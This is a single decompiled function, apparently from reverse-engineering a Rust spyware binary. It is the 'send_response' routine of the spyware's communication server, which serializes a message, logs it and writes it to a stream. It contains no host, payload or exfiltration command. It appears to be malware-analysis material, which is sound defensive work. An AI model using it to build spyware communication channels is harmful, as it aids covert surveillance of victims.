
  void** spyware::communication::server::send_response::h17eae7eef2507d79(int64_t* arg1, int64_t arg2)

{
    int64_t var_88 = arg2;
    char const (** const var_78)[0xd8];
    spyware::communication::serialization::serialize_message::hd905e118d95099f9(&var_78, arg1);
    char const (** const rax_1)[0xd8] = var_78;
    void** result_1;
    void** result = result_1;
    
    if (-(rax_1) != -0x8000000000000000)
    {
        char const (** const var_a0)[0xd8] = rax_1;
        
        if (core::sync::atomic::atomic_load::h8c88032dab18ab12() >= 4)
        {
            int64_t* var_80 = &var_a0;
            int64_t** var_48 = &var_80;
            int64_t (* var_40_1)(int64_t* arg1, void* arg2) =
                _$LT$$RF$T$u20$as$u20$core..fmt..Debug$GT$::fmt::h08d9ba86704c45fa;
            var_78 = &data_4b8ae8;
            int64_t var_70 = 1;
            int64_t var_58_1 = 0;
            int64_t*** var_68_1 = &var_48;
            int64_t var_60_1 = 1;
            int64_t rax_3 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b8af8);
            char const* const var_38 = "spyware::communication::serverUn…";
            int64_t var_30_1 = 0x1e;
            char const* const var_28_1 = "spyware::communication::serverUn…";
            int64_t var_20_1 = 0x1e;
            int64_t var_18_1 = rax_3;
            log::__private_api::log::h13afddf373bd7d7f(&var_78, 4, &var_38);
        }
        
        uint64_t var_68;
        result = std::io::Write::write_all::h86cd82e88e6fd894(&var_88, result, var_68);
        core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$u8$GT$$GT$::h5aa1feab37440eed(&var_a0);
        
        if (!result)
            return nullptr;
    }
    
    return result;
}
